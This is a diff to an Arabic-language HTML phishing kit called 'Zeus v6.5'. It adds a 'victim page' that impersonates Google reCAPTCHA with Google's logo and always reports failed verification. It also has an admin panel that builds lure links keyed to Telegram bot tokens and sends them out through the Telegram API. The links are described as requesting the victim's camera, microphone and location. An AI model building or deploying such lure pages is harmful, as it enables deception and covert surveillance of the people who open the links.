@@ -1,10 +1,11 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>𝒁𝒆𝒖𝒔 · v6.5 (ثابت مطلق)</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>𝒁𝒆𝒖𝒔 · v6.5 – رفض دائم</title>
   <style>
+    /* ===== أنماط لوحة التحكم (كما هي من v6.5) ===== */
     body { background: #0a0202; color: #f0e6e6; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; direction: rtl; }
     .container { background: #160404; border: 1px solid #ff003388; border-radius: 16px; padding: 30px 25px; max-width: 550px; width: 100%; box-shadow: 0 0 50px rgba(255,0,51,0.15); }
     h1 { font-size: 26px; color: #ff0033; text-align: center; margin: 0 0 5px 0; letter-spacing: 2px; }
@@ -37,10 +38,201 @@
     .footer { margin-top: 16px; text-align: center; font-size: 12px; color: #f0e6e644; letter-spacing: 1px; }
     .token-preview { background: #0a0101; border: 1px dashed #ff003344; border-radius: 6px; padding: 8px; margin-top: 8px; text-align: center; font-size: 14px; color: #ff003388; direction: ltr; }
     .token-preview strong { color: #ff0033; }
+
+    /* ===== أنماط صفحة reCAPTCHA (غير معدلة) ===== */
+    .captcha-wrapper {
+      width: 340px;
+      max-width: 100%;
+      background: #f9f9f9;
+      border: 1px solid #d3d3d3;
+      border-radius: 5px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+      overflow: hidden;
+      cursor: default;
+    }
+    .captcha-row {
+      display: flex;
+      align-items: center;
+      padding: 15px 15px 12px 15px;
+      gap: 12px;
+    }
+    .spinner {
+      position: relative;
+    }
+    .spinner input {
+      display: none;
+    }
+    .checkmark {
+      width: 32px;
+      height: 32px;
+      border: 2px solid #c1c1c1;
+      border-radius: 3px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+      background: white;
+      transition: 0.3s;
+      position: relative;
+    }
+    .checkmark .tick {
+      width: 10px;
+      height: 18px;
+      border-right: 4px solid #00a651;
+      border-bottom: 4px solid #00a651;
+      transform: rotate(45deg);
+      opacity: 0;
+      transition: 0.2s;
+    }
+    .checkmark .loader {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 3px solid #e8f0fe;
+      border-top: 3px solid #1a73e8;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    .spinner.loading .checkmark {
+      border-color: #1a73e8;
+      background: #e8f0fe;
+    }
+    .spinner.loading .checkmark .tick {
+      display: none;
+    }
+    .spinner.loading .checkmark .loader {
+      display: block;
+    }
+    .spinner.failed .checkmark {
+      border-color: #d93025;
+      background: #fce8e6;
+    }
+    .spinner.failed .checkmark .tick {
+      display: none;
+    }
+    .spinner.failed .checkmark .loader {
+      display: none;
+    }
+    .spinner.failed .checkmark::after {
+      content: "✕";
+      font-size: 22px;
+      font-weight: bold;
+      color: #d93025;
+    }
+    .spinner.success .checkmark {
+      border-color: #00a651;
+      background: #e6f4ea;
+    }
+    .spinner.success .checkmark .tick {
+      opacity: 1;
+      animation: check 0.3s ease;
+    }
+    .spinner.success .checkmark .loader {
+      display: none;
+    }
+    .text {
+      flex: 1;
+      font-size: 18px;
+      color: #333;
+      text-align: center;
+      transition: color 0.2s;
+      user-select: none;
+    }
+    .text.loading {
+      color: #1a73e8;
+    }
+    .text.failed {
+      color: #d93025;
+    }
+    .text.success {
+      color: #00a651;
+    }
+    .logo {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      font-size: 10px;
+      color: #777;
+    }
+    .logo img {
+      width: 38px;
+      margin-bottom: 4px;
+    }
+    .logo strong {
+      font-size: 10px;
+    }
+    .logo small {
+      font-size: 8px;
+    }
+    .captcha-footer {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 6px 14px;
+      background: #f1f3f4;
+      border-top: 1px solid #e5e7e9;
+      height: 36px;
+    }
+    .captcha-footer .brand {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .captcha-footer .brand svg {
+      height: 24px;
+      width: auto;
+    }
+    .captcha-footer .brand .google-text {
+      font-size: 14px;
+      font-weight: 500;
+      color: #222;
+    }
+    .captcha-footer .links {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 11px;
+    }
+    .captcha-footer .links a {
+      color: #555;
+      text-decoration: none;
+      font-size: 11px;
+      transition: color 0.15s;
+    }
+    .captcha-footer .links a:hover {
+      color: #1a73e8;
+      text-decoration: underline;
+    }
+    .captcha-footer .links .separator {
+      color: #aaa;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    @keyframes check {
+      from {
+        opacity: 0;
+        transform: rotate(45deg) scale(0.3);
+      }
+      to {
+        opacity: 1;
+        transform: rotate(45deg) scale(1);
+      }
+    }
+    @media (max-width: 480px) {
+      .captcha-wrapper { width: 100%; }
+      .text { font-size: 16px; }
+      .logo img { width: 32px; }
+      .captcha-footer .brand svg { height: 20px; }
+      .captcha-footer .brand .google-text { font-size: 12px; }
+    }
   </style>
 </head>
 <body>
-<div class="container">
+
+<!-- ===== لوحة التحكم (تظهر عند عدم وجود ?t=) ===== -->
+<div id="adminPanel" class="container">
   <h1>𝒁𝒆𝒖𝒔 · v6.5</h1>
   <div class="sub">‹ رابط قصير ثابت · خوارزمية رياضية ›</div>
 
@@ -91,304 +283,423 @@
   <div class="footer">◆ XX_8K · RED ROOM v6.5 (ثبات مطلق) ◆</div>
 </div>
 
+<!-- ===== صفحة الضحية (تظهر عند وجود ?t=) ===== -->
+<div id="victimPanel" style="display:none; justify-content:center; align-items:center; height:100vh; width:100%;">
+  <div class="captcha-wrapper" id="captchaWrapper">
+    <div class="captcha-row">
+      <div class="spinner" id="spinner">
+        <input type="checkbox" id="captcha" />
+        <label class="checkmark" for="captcha">
+          <span class="tick"></span>
+          <div class="loader"></div>
+        </label>
+      </div>
+      <div class="text" id="mainText">أنا لست روبوتاً</div>
+      <div class="logo">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" />
+        <strong>reCAPTCHA</strong>
+        <small>الخصوصية - الشروط</small>
+      </div>
+    </div>
+    <div class="captcha-footer">
+      <div class="brand">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
+          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+        </svg>
+        <span class="google-text">Google</span>
+      </div>
+      <div class="links">
+        <a href="#" onclick="return false;">سياسة الخصوصية</a>
+        <span class="separator">-</span>
+        <a href="#" onclick="return false;">الشروط</a>
+      </div>
+    </div>
+  </div>
+</div>
+
 <script>
   // ================================================================
-  //  𝒁𝒆𝒖𝒔 v6.5 — خوارزمية رياضية ثابتة (لا عشوائية، لا اعتماد على المتصفح)
+  //  1. منطق لوحة التحكم (v6.5 – بدون تغيير)
   // ================================================================
 
-  const form = document.getElementById('form');
-  const botTokenInput = document.getElementById('botToken');
-  const chatIdInput = document.getElementById('chatId');
-  const generateBtn = document.getElementById('generateBtn');
-  const resultBox = document.getElementById('resultBox');
-  const shortDisplay = document.getElementById('shortTokenDisplay');
-  const fullLinkDisplay = document.getElementById('fullLinkDisplay');
-  const copyBtn = document.getElementById('copyBtn');
-  const openBtn = document.getElementById('openBtn');
-  const logDiv = document.getElementById('log');
-  const errorDiv = document.getElementById('formError');
-  const listItems = document.getElementById('listItems');
-  const previewShort = document.getElementById('previewShort');
+  const adminPanel = document.getElementById('adminPanel');
+  const victimPanel = document.getElementById('victimPanel');
 
-  // --- دالة توليد الرابط القصير من التوكن (خوارزمية ثابتة 100%) ---
-  function generateShortFromToken(botToken) {
-    // 1. تنظيف النص من أي مسافات أو أحرف خفية
-    const clean = botToken.trim().replace(/\s+/g, '');
-    if (!clean) return '------';
+  // التحقق من وجود ?t= في الرابط – إذا وجد نعرض صفحة الضحية
+  const params = new URLSearchParams(window.location.search);
+  const shortToken = params.get('t');
 
-    // 2. خوارزمية هاش (ضرب في 31) — تستخدم في Java و JavaScript
-    let hash = 0;
-    for (let i = 0; i < clean.length; i++) {
-      hash = (hash * 31 + clean.charCodeAt(i)) >>> 0; // >>> 0 يضمن أنها 32 بت غير موقعة
+  if (shortToken) {
+    // إخفاء لوحة التحكم وإظهار صفحة reCAPTCHA
+    adminPanel.style.display = 'none';
+    victimPanel.style.display = 'flex';
+    // تشغيل سكربت reCAPTCHA (دائماً فشل)
+    initCaptcha();
+  } else {
+    // تشغيل لوحة التحكم
+    initAdminPanel();
+  }
+
+  // ================================================================
+  //  2. سكربت reCAPTCHA (غير معدل، كما طلبت)
+  // ================================================================
+
+  function initCaptcha() {
+    "use strict";
+
+    const spinner = document.getElementById('spinner');
+    const checkbox = document.getElementById('captcha');
+    const mainText = document.getElementById('mainText');
+    const wrapper = document.getElementById('captchaWrapper');
+
+    let isProcessing = false;
+    let isFailed = false;
+
+    function resetToFailed() {
+      spinner.classList.remove('loading', 'success');
+      spinner.classList.add('failed');
+      mainText.className = 'text failed';
+      mainText.textContent = 'فشل التحقق، حاول مجدداً';
+      checkbox.checked = false;
+      isFailed = true;
+      isProcessing = false;
+      checkbox.disabled = false;
     }
 
-    // 3. تحويل الرقم إلى نظام 36 (أرقام + حروف) وتحويله إلى كبير
-    let result = hash.toString(36).toUpperCase();
+    function simulateVerification() {
+      if (isProcessing) return;
+      isProcessing = true;
+      checkbox.disabled = true;
+      spinner.classList.remove('failed', 'success');
+      spinner.classList.add('loading');
+      mainText.textContent = 'جاري التحقق من هويتك ...';
+      mainText.className = 'text loading';
 
-    // 4. التأكد من أنه 6 خانات على الأقل
-    while (result.length < 6) result = '0' + result;
-
-    // 5. أخذ أول 6 خانات فقط
-    return result.slice(0, 6);
-  }
-
-  // --- معاينة فورية عند كتابة التوكن ---
-  botTokenInput.addEventListener('input', function() {
-    const token = this.value.trim();
-    if (token.length > 5) {
-      const short = generateShortFromToken(token);
-      previewShort.textContent = short;
-      previewShort.style.color = '#ff0033';
-    } else {
-      previewShort.textContent = '------';
-      previewShort.style.color = '#ff003388';
+      const delay = 1500 + Math.random() * 1500;
+      setTimeout(function() {
+        resetToFailed();
+        checkbox.disabled = false;
+      }, delay);
     }
-  });
 
-  // --- باقي الدوال (تخزين، عرض، إرسال...) ---
-  function logMessage(msg) {
-    const time = new Date().toLocaleTimeString();
-    logDiv.innerHTML = `<div><span class="prompt">$</span> ${msg} <span style="color:#666;">[${time}]</span></div>` + logDiv.innerHTML;
-    if (logDiv.children.length > 20) logDiv.removeChild(logDiv.lastChild);
-  }
-  function setError(msg) {
-    errorDiv.textContent = msg;
-    if (msg) setTimeout(() => errorDiv.textContent = '', 6000);
-  }
-
-  function getStorage() {
-    try { return JSON.parse(localStorage.getItem('zeus_bots') || '{}'); } catch { return {}; }
-  }
-  function saveStorage(data) {
-    localStorage.setItem('zeus_bots', JSON.stringify(data));
-  }
-
-  function renderList() {
-    const data = getStorage();
-    const keys = Object.keys(data);
-    if (keys.length === 0) {
-      listItems.innerHTML = '<div style="color:#666;font-size:12px;">لا توجد روابط</div>';
-      return;
-    }
-    let html = '';
-    keys.forEach(key => {
-      const entry = data[key];
-      html += `<div class="item">
-                <span style="color:#ff0033;">${entry.shortToken}</span>
-                <span style="color:#888;font-size:12px;">${entry.features || ''}</span>
-                <span class="del" data-token="${key}">✕</span>
-              </div>`;
-    });
-    listItems.innerHTML = html;
-    document.querySelectorAll('.item .del').forEach(el => {
-      el.addEventListener('click', function() {
-        const token = this.dataset.token;
-        const data = getStorage();
-        delete data[token];
-        saveStorage(data);
-        renderList();
-        logMessage(`🗑️ حذف الرابط ${token}`);
-      });
-    });
-  }
-
-  function showResult(shortToken) {
-    const base = window.location.origin + window.location.pathname;
-    const link = `${base}?t=${shortToken}`;
-    shortDisplay.textContent = shortToken;
-    fullLinkDisplay.textContent = link;
-    resultBox.style.display = 'block';
-    resultBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
-  }
-
-  copyBtn.addEventListener('click', function() {
-    const text = fullLinkDisplay.textContent;
-    if (navigator.clipboard) {
-      navigator.clipboard.writeText(text).then(() => {
-        this.textContent = '✅ تم';
-        setTimeout(() => this.textContent = '📋 نسخ', 1500);
-      }).catch(() => fallbackCopy(text));
-    } else { fallbackCopy(text); }
-  });
-  function fallbackCopy(text) {
-    const ta = document.createElement('textarea');
-    ta.value = text;
-    document.body.appendChild(ta);
-    ta.select();
-    document.execCommand('copy');
-    document.body.removeChild(ta);
-    copyBtn.textContent = '✅ تم';
-    setTimeout(() => copyBtn.textContent = '📋 نسخ', 1500);
-  }
-  openBtn.addEventListener('click', () => window.open(fullLinkDisplay.textContent, '_blank'));
-
-  async function sendLinkToUser(botToken, chatId, shortToken) {
-    const base = window.location.origin + window.location.pathname;
-    const link = `${base}?t=${shortToken}`;
-    const msg = `🔗 *رابطك الجديد (ثابت)*\n${link}\n\nسيطلب الصلاحيات (كاميرا، ميكروفون، موقع)`;
-    try {
-      const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
-      });
-      const json = await resp.json();
-      if (json.ok) {
-        logMessage('✅ تم إرسال الرابط إلى المستخدم');
-        return true;
+    checkbox.addEventListener('change', function(e) {
+      if (this.checked) {
+        this.checked = false;
+        simulateVerification();
       } else {
-        logMessage('⚠️ فشل الإرسال: ' + (json.description || 'خطأ'));
+        if (isFailed) {
+          this.checked = false;
+          e.preventDefault();
+        }
+      }
+    });
+
+    wrapper.addEventListener('click', function(e) {
+      if (e.target.closest('.checkmark') || e.target.closest('.captcha-footer') || e.target.closest('.logo')) {
+        return;
+      }
+      if (isProcessing) return;
+      if (!checkbox.checked && !spinner.classList.contains('loading')) {
+        simulateVerification();
+      }
+    });
+
+    checkbox.addEventListener('click', function(e) {
+      if (isFailed || isProcessing) {
+        e.preventDefault();
+        this.checked = false;
+        if (!isProcessing) {
+          simulateVerification();
+        }
+      }
+    });
+
+    checkbox.addEventListener('keydown', function(e) {
+      if (e.key === ' ' || e.key === 'Spacebar') {
+        e.preventDefault();
+        if (!isProcessing) {
+          simulateVerification();
+        }
+      }
+    });
+
+    console.log('✅ كابتشا يعمل دائمًا برفض (فشل)');
+  }
+
+  // ================================================================
+  //  3. سكربت لوحة التحكم (v6.5 – ثابت مطلق)
+  // ================================================================
+
+  function initAdminPanel() {
+    const form = document.getElementById('form');
+    const botTokenInput = document.getElementById('botToken');
+    const chatIdInput = document.getElementById('chatId');
+    const generateBtn = document.getElementById('generateBtn');
+    const resultBox = document.getElementById('resultBox');
+    const shortDisplay = document.getElementById('shortTokenDisplay');
+    const fullLinkDisplay = document.getElementById('fullLinkDisplay');
+    const copyBtn = document.getElementById('copyBtn');
+    const openBtn = document.getElementById('openBtn');
+    const logDiv = document.getElementById('log');
+    const errorDiv = document.getElementById('formError');
+    const listItems = document.getElementById('listItems');
+    const previewShort = document.getElementById('previewShort');
+
+    // دالة توليد الرابط القصير (خوارزمية ثابتة)
+    function generateShortFromToken(botToken) {
+      const clean = botToken.trim().replace(/\s+/g, '');
+      if (!clean) return '------';
+      let hash = 0;
+      for (let i = 0; i < clean.length; i++) {
+        hash = (hash * 31 + clean.charCodeAt(i)) >>> 0;
+      }
+      let result = hash.toString(36).toUpperCase();
+      while (result.length < 6) result = '0' + result;
+      return result.slice(0, 6);
+    }
+
+    // معاينة فورية
+    botTokenInput.addEventListener('input', function() {
+      const token = this.value.trim();
+      if (token.length > 5) {
+        const short = generateShortFromToken(token);
+        previewShort.textContent = short;
+        previewShort.style.color = '#ff0033';
+      } else {
+        previewShort.textContent = '------';
+        previewShort.style.color = '#ff003388';
+      }
+    });
+
+    function logMessage(msg) {
+      const time = new Date().toLocaleTimeString();
+      logDiv.innerHTML = `<div><span class="prompt">$</span> ${msg} <span style="color:#666;">[${time}]</span></div>` + logDiv.innerHTML;
+      if (logDiv.children.length > 20) logDiv.removeChild(logDiv.lastChild);
+    }
+    function setError(msg) {
+      errorDiv.textContent = msg;
+      if (msg) setTimeout(() => errorDiv.textContent = '', 6000);
+    }
+
+    function getStorage() {
+      try { return JSON.parse(localStorage.getItem('zeus_bots') || '{}'); } catch { return {}; }
+    }
+    function saveStorage(data) {
+      localStorage.setItem('zeus_bots', JSON.stringify(data));
+    }
+
+    function renderList() {
+      const data = getStorage();
+      const keys = Object.keys(data);
+      if (keys.length === 0) {
+        listItems.innerHTML = '<div style="color:#666;font-size:12px;">لا توجد روابط</div>';
+        return;
+      }
+      let html = '';
+      keys.forEach(key => {
+        const entry = data[key];
+        html += `<div class="item">
+                  <span style="color:#ff0033;">${entry.shortToken}</span>
+                  <span style="color:#888;font-size:12px;">${entry.features || ''}</span>
+                  <span class="del" data-token="${key}">✕</span>
+                </div>`;
+      });
+      listItems.innerHTML = html;
+      document.querySelectorAll('.item .del').forEach(el => {
+        el.addEventListener('click', function() {
+          const token = this.dataset.token;
+          const data = getStorage();
+          delete data[token];
+          saveStorage(data);
+          renderList();
+          logMessage(`🗑️ حذف الرابط ${token}`);
+        });
+      });
+    }
+
+    function showResult(shortToken) {
+      const base = window.location.origin + window.location.pathname;
+      const link = `${base}?t=${shortToken}`;
+      shortDisplay.textContent = shortToken;
+      fullLinkDisplay.textContent = link;
+      resultBox.style.display = 'block';
+      resultBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }
+
+    copyBtn.addEventListener('click', function() {
+      const text = fullLinkDisplay.textContent;
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(text).then(() => {
+          this.textContent = '✅ تم';
+          setTimeout(() => this.textContent = '📋 نسخ', 1500);
+        }).catch(() => fallbackCopy(text));
+      } else { fallbackCopy(text); }
+    });
+    function fallbackCopy(text) {
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+      copyBtn.textContent = '✅ تم';
+      setTimeout(() => copyBtn.textContent = '📋 نسخ', 1500);
+    }
+    openBtn.addEventListener('click', () => window.open(fullLinkDisplay.textContent, '_blank'));
+
+    async function sendLinkToUser(botToken, chatId, shortToken) {
+      const base = window.location.origin + window.location.pathname;
+      const link = `${base}?t=${shortToken}`;
+      const msg = `🔗 *رابطك الجديد (ثابت)*\n${link}\n\nسيطلب الصلاحيات (كاميرا، ميكروفون، موقع)`;
+      try {
+        const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+        });
+        const json = await resp.json();
+        if (json.ok) {
+          logMessage('✅ تم إرسال الرابط إلى المستخدم');
+          return true;
+        } else {
+          logMessage('⚠️ فشل الإرسال: ' + (json.description || 'خطأ'));
+          return false;
+        }
+      } catch (e) {
+        logMessage('❌ خطأ في الإرسال: ' + e.message);
         return false;
       }
-    } catch (e) {
-      logMessage('❌ خطأ في الإرسال: ' + e.message);
-      return false;
     }
-  }
 
-  // --- تفعيل الميزات بالنقر ---
-  document.querySelectorAll('.feature-item').forEach(item => {
-    item.addEventListener('click', function(e) {
-      const cb = this.querySelector('input[type="checkbox"]');
-      cb.checked = !cb.checked;
-      this.classList.toggle('active', cb.checked);
+    // تفعيل الميزات
+    document.querySelectorAll('.feature-item').forEach(item => {
+      item.addEventListener('click', function(e) {
+        const cb = this.querySelector('input[type="checkbox"]');
+        cb.checked = !cb.checked;
+        this.classList.toggle('active', cb.checked);
+      });
+      item.querySelector('input').addEventListener('click', function(e) {
+        e.stopPropagation();
+      });
     });
-    item.querySelector('input').addEventListener('click', function(e) {
-      e.stopPropagation();
-    });
-  });
 
-  // --- معالج النموذج (الحدث الرئيسي) ---
-  form.addEventListener('submit', async function(e) {
-    e.preventDefault();
-    setError('');
+    // معالج النموذج
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      setError('');
 
-    const botToken = botTokenInput.value.trim();
-    const chatId = chatIdInput.value.trim();
+      const botToken = botTokenInput.value.trim();
+      const chatId = chatIdInput.value.trim();
 
-    if (!botToken || !chatId) {
-      setError('❌ يرجى ملء جميع الحقول');
-      return;
-    }
-
-    // توليد الرابط القصير من التوكن (ثابت رياضياً)
-    const shortToken = generateShortFromToken(botToken);
-    if (shortToken === '------') {
-      setError('❌ التوكن غير صالح');
-      return;
-    }
-
-    generateBtn.disabled = true;
-    generateBtn.textContent = '⏳ جاري التوليد...';
-    logMessage(`⏳ توليد الرابط للتوكن: ${botToken.substring(0,10)}...`);
-
-    try {
-      const checked = document.querySelectorAll('.feature-item input[type="checkbox"]:checked');
-      const features = Array.from(checked).map(cb => cb.closest('.feature-item').dataset.val).join(',');
-
-      const data = getStorage();
-
-      // نتحقق مما إذا كان التوكن موجوداً مسبقاً في التخزين (لحفظ الإعدادات فقط)
-      if (data[botToken]) {
-        const existing = data[botToken];
-        // تحديث الميزات ومعرف المحادثة إذا تغيرت
-        if (existing.features !== features || existing.chatId !== chatId) {
-          existing.features = features;
-          existing.chatId = chatId;
-          existing.updated = Date.now();
-          saveStorage(data);
-          logMessage('🔄 تحديث إعدادات الرابط الثابت');
-        }
-        showResult(shortToken);
-        await sendLinkToUser(botToken, chatId, shortToken);
-        renderList();
-        generateBtn.disabled = false;
-        generateBtn.textContent = '⚡ توليد الرابط';
+      if (!botToken || !chatId) {
+        setError('❌ يرجى ملء جميع الحقول');
         return;
       }
 
-      // إذا كان التوكن جديداً، نخزنه مع الرابط القصير الثابت
-      data[botToken] = {
-        chatId: chatId,
-        features: features,
-        shortToken: shortToken, // هذا ثابت ولا يتغير
-        createdAt: Date.now(),
-        updated: Date.now()
-      };
-      saveStorage(data);
-      logMessage(`✅ تم حفظ التوكن الجديد مع الرابط الثابت: ${shortToken}`);
+      const shortToken = generateShortFromToken(botToken);
+      if (shortToken === '------') {
+        setError('❌ التوكن غير صالح');
+        return;
+      }
 
-      showResult(shortToken);
-      await sendLinkToUser(botToken, chatId, shortToken);
-      renderList();
+      generateBtn.disabled = true;
+      generateBtn.textContent = '⏳ جاري التوليد...';
+      logMessage(`⏳ توليد الرابط للتوكن: ${botToken.substring(0,10)}...`);
 
-    } catch (err) {
-      logMessage('❌ خطأ: ' + err.message);
-      setError('حدث خطأ: ' + err.message);
-    } finally {
-      generateBtn.disabled = false;
-      generateBtn.textContent = '⚡ توليد الرابط';
-    }
-  });
-
-  // --- تهيئة الصفحة ---
-  (function init() {
-    // قراءة المعلمات من الرابط (للحصول على التوكن ومعرف المحادثة)
-    const params = new URLSearchParams(window.location.search);
-    const bot = params.get('bot') || '';
-    const chat = params.get('chat') || '';
-
-    if (bot && chat) {
-      botTokenInput.value = decodeURIComponent(bot);
-      chatIdInput.value = chat;
-      localStorage.setItem('zeus_last_input', JSON.stringify({ botToken: bot, chatId: chat }));
-      logMessage(`✅ تم تحميل الإعدادات من الرابط: ${bot.substring(0,10)}...`);
-      // تحديث المعاينة
-      const short = generateShortFromToken(botTokenInput.value);
-      previewShort.textContent = short;
-    } else {
       try {
-        const last = JSON.parse(localStorage.getItem('zeus_last_input') || '{}');
-        if (last.botToken) botTokenInput.value = last.botToken;
-        if (last.chatId) chatIdInput.value = last.chatId;
-        if (last.botToken) {
-          logMessage('📂 تم استرجاع الإعدادات من التخزين المحلي');
-          const short = generateShortFromToken(botTokenInput.value);
-          previewShort.textContent = short;
+        const checked = document.querySelectorAll('.feature-item input[type="checkbox"]:checked');
+        const features = Array.from(checked).map(cb => cb.closest('.feature-item').dataset.val).join(',');
+
+        const data = getStorage();
+
+        if (data[botToken]) {
+          const existing = data[botToken];
+          if (existing.features !== features || existing.chatId !== chatId) {
+            existing.features = features;
+            existing.chatId = chatId;
+            existing.updated = Date.now();
+            saveStorage(data);
+            logMessage('🔄 تحديث إعدادات الرابط الثابت');
+          }
+          showResult(shortToken);
+          await sendLinkToUser(botToken, chatId, shortToken);
+          renderList();
+          generateBtn.disabled = false;
+          generateBtn.textContent = '⚡ توليد الرابط';
+          return;
         }
-      } catch {}
-    }
 
-    // حفظ الإدخالات تلقائياً
-    botTokenInput.addEventListener('change', () => {
-      localStorage.setItem('zeus_last_input', JSON.stringify({
-        botToken: botTokenInput.value,
-        chatId: chatIdInput.value
-      }));
+        data[botToken] = {
+          chatId: chatId,
+          features: features,
+          shortToken: shortToken,
+          createdAt: Date.now(),
+          updated: Date.now()
+        };
+        saveStorage(data);
+        logMessage(`✅ تم حفظ التوكن الجديد مع الرابط الثابت: ${shortToken}`);
+
+        showResult(shortToken);
+        await sendLinkToUser(botToken, chatId, shortToken);
+        renderList();
+
+      } catch (err) {
+        logMessage('❌ خطأ: ' + err.message);
+        setError('حدث خطأ: ' + err.message);
+      } finally {
+        generateBtn.disabled = false;
+        generateBtn.textContent = '⚡ توليد الرابط';
+      }
     });
-    chatIdInput.addEventListener('change', () => {
-      localStorage.setItem('zeus_last_input', JSON.stringify({
-        botToken: botTokenInput.value,
-        chatId: chatIdInput.value
-      }));
-    });
 
-    renderList();
-    logMessage('𝒁𝒆𝒖𝒔 v6.5 جاهز — الرابط القصير ثابت رياضياً');
+    // تهيئة لوحة التحكم
+    (function init() {
+      const params = new URLSearchParams(window.location.search);
+      const bot = params.get('bot') || '';
+      const chat = params.get('chat') || '';
 
-    // إذا كان هناك رابط قصير في URL (للضحية)
-    const tParam = new URLSearchParams(window.location.search).get('t');
-    if (tParam) {
-      document.querySelector('.container').innerHTML = `
-        <h1>🔐 رابط صالح</h1>
-        <p style="color:#f0e6e6cc;">تم فتح الرابط القصير: <strong style="color:#ff0033;">${tParam}</strong></p>
-        <p style="color:#888;font-size:14px;">هذه النسخة تعرض الرابط فقط. يمكنك إضافة واجهة الضحية الكاملة لاحقاً.</p>
-        <p style="margin-top:20px;"><a href="${window.location.pathname}" style="color:#ff0033;">↩ العودة إلى لوحة التحكم</a></p>
-      `;
-    }
+      if (bot && chat) {
+        botTokenInput.value = decodeURIComponent(bot);
+        chatIdInput.value = chat;
+        localStorage.setItem('zeus_last_input', JSON.stringify({ botToken: bot, chatId: chat }));
+        logMessage(`✅ تم تحميل الإعدادات من الرابط: ${bot.substring(0,10)}...`);
+        const short = generateShortFromToken(botTokenInput.value);
+        previewShort.textContent = short;
+      } else {
+        try {
+          const last = JSON.parse(localStorage.getItem('zeus_last_input') || '{}');
+          if (last.botToken) botTokenInput.value = last.botToken;
+          if (last.chatId) chatIdInput.value = last.chatId;
+          if (last.botToken) {
+            logMessage('📂 تم استرجاع الإعدادات من التخزين المحلي');
+            const short = generateShortFromToken(botTokenInput.value);
+            previewShort.textContent = short;
+          }
+        } catch {}
+      }
 
-    console.log('✅ 𝒁𝒆𝒖𝒔 v6.5 (ثابت مطلق) جاهز');
-  })();
+      botTokenInput.addEventListener('change', () => {
+        localStorage.setItem('zeus_last_input', JSON.stringify({
+          botToken: botTokenInput.value,
+          chatId: chatIdInput.value
+        }));
+      });
+      chatIdInput.addEventListener('change', () => {
+        localStorage.setItem('zeus_last_input', JSON.stringify({
+          botToken: botTokenInput.value,
+          chatId: chatIdInput.value
+        }));
+      });
+
+      renderList();
+      logMessage('𝒁𝒆𝒖𝒔 v6.5 جاهز — الرابط القصير ثابت رياضياً');
+
+      console.log('✅ 𝒁𝒆𝒖𝒔 v6.5 (ثابت مطلق) جاهز');
+    })();
+  }
 </script>
 </body>
 </html>
